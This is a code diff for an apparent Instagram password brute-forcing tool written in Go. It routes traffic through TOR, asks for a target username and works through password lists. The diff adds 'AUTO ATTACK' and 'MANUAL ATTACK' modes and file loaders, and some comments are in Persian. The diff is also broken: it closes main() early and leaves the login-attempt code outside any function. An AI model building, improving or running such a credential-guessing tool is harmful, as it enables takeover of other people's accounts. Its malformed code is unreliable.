@@ -106,13 +106,26 @@ func main() {
 		fmt.Println("TOR is not active , direct connection is active\n")
 	}
 
-	username := getUsername()
-	passwords := loadPasswords()
+// نمایش منو و انتخاب حالت
+	mode := selectMode()
+	var passwords []string
+
+	if mode == 1 {
+		// AUTO ATTACK
+		passwords = loadPasswordsAuto()
+	} else {
+		// MANUAL ATTACK
+		passwords = loadPasswordsManual()
+	}
+
 	if len(passwords) == 0 {
-		fmt.Println("No passwords found in password.txt or password.json!")
+		fmt.Println("No passwords found!")
 		return
 	}
+
 	fmt.Printf("\nLoaded %d passwords\n", len(passwords))
+	// ... بقیه کد مثل قبل
+}
 
 	fmt.Println("\nStarting login attempts...\n")
 	found := make(chan LoginResult, 1)
@@ -209,6 +222,69 @@ func getUsername() string {
 	fmt.Print("Enter Instagram username: ")
 	username, _ := reader.ReadString('\n')
 	return trim(username)
+}
+////new adddddddddddddddddd
+func selectMode() int {
+	reader := bufio.NewReader(os.Stdin)
+	fmt.Println("Choose attack mode:")
+	fmt.Println("[1] AUTO ATTACK (use default passwords)")
+	fmt.Println("[2] MANUAL ATTACK (use your own password file)")
+	fmt.Print("Enter your choice (1 or 2): ")
+	for {
+		input, _ := reader.ReadString('\n')
+		input = strings.TrimSpace(input)
+		if input == "1" || input == "2" {
+			if input == "1" {
+				return 1
+			} else {
+				return 2
+			}
+		}
+		fmt.Print("Invalid choice. Please enter 1 or 2: ")
+	}
+} 
+
+func loadPasswordsAuto() []string {
+	return loadPasswordsFromFiles("password.txt", "password.json")
+}
+
+// بارگذاری پسورد از فایل کاربر
+func loadPasswordsManual() []string {
+	reader := bufio.NewReader(os.Stdin)
+	fmt.Print("Enter your password file path: ")
+	filePath, _ := reader.ReadString('\n')
+	filePath = strings.TrimSpace(filePath)
+	return loadPasswordsFromFiles(filePath, "")
+}
+
+// تابع عمومی بارگذاری پسورد
+func loadPasswordsFromFiles(txtFile string, jsonFile string) []string {
+	var passwords []string
+	if txtFile != "" {
+		file, err := os.Open(txtFile)
+		if err == nil {
+			defer file.Close()
+			scanner := bufio.NewScanner(file)
+			for scanner.Scan() {
+				pass := strings.TrimSpace(scanner.Text())
+				if pass != "" {
+					passwords = append(passwords, pass)
+				}
+			}
+		}
+	}
+	if jsonFile != "" {
+		fileJSON, errj := os.Open(jsonFile)
+		if errj == nil {
+			defer fileJSON.Close()
+			var jsonPasswords []string
+			decoder := json.NewDecoder(fileJSON)
+			if err := decoder.Decode(&jsonPasswords); err == nil {
+				passwords = append(passwords, jsonPasswords...)
+			}
+		}
+	}
+	return passwords
 }
 
 func showProgressBar(total int, progress <-chan int) {
